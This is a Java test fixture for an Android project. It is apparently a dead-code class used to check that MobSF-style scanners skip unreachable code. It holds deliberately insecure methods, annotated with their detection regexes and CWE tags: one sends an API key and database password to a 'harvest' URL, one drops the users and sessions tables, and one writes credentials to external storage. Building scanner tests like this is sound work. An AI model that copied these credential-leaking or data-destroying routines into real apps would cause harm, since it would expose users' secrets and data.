package com.test.reachability;

// ORPHANED CLASS - reachability test: should NOT be flagged
//
// Dead code methods extracted from MainActivity.java.
// None of these methods are ever called or referenced.

import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.util.Log;

import java.io.FileWriter;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * This class is never instantiated or referenced anywhere in the project.
 * It contains dead code methods originally in MainActivity, extracted here
 * so that reachability analysis tools can be validated against them.
 */
public class DeadMainActivity {

    private static final String TAG = "DeadMainActivity";

    // DEAD CODE - reachability test: should NOT be flagged
    // Simulated MobSF Rule: android_hardcoded (key=... / pass=... pattern)
    // Pattern: (key\s*=\s*['|"].{1,100}['|"]) | (pass\s*=\s*['|"].{1,100}['|"])
    // input_case: lower | type: Regex
    // CWE: CWE-312 | OWASP Mobile: M9 | MASVS: storage-14
    // Also matches: android_ip_disclosure (IP address in URL)
    private void leakCredentialsToUrl() {
        try {
            String leakUrl = "http://10.0.2.2/harvest?key=" + MainActivity.API_KEY + "&pass=" + MainActivity.DB_PASSWORD;
            URL url = new URL(leakUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();
            connection.disconnect();
        } catch (IOException e) {
            Log.e(TAG, "Leak failed", e);
        }
    }

    // DEAD CODE - reachability test: should NOT be flagged
    // Simulated MobSF Rule: android_sql_raw_query
    // Pattern: android\.database\.sqlite AND (rawQuery\( | execSQL\()
    // input_case: exact | type: RegexAndOr
    // CWE: CWE-89 | OWASP Mobile: M7 | MASVS: (none)
    private void nukeDatabase() {
        SQLiteDatabase db = SQLiteDatabase.create(null);
        db.execSQL("DROP TABLE IF EXISTS users");
        db.execSQL("DROP TABLE IF EXISTS sessions");
        db.close();
    }

    // DEAD CODE - reachability test: should NOT be flagged
    // Simulated MobSF Rule: android_read_write_external
    // Pattern: \.getExternalStorage | \.getExternalFilesDir\(
    // input_case: exact | type: RegexOr
    // CWE: CWE-276 | OWASP Mobile: M2 | MASVS: storage-2
    @SuppressWarnings("deprecation")
    private void writeCredsToExternalStorage() {
        try {
            java.io.File file = new java.io.File(Environment.getExternalStorageDirectory(), "leaked_creds.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(MainActivity.API_KEY + "\n" + MainActivity.DB_PASSWORD);
            writer.close();
        } catch (IOException e) {
            Log.e(TAG, "Write failed", e);
        }
    }
}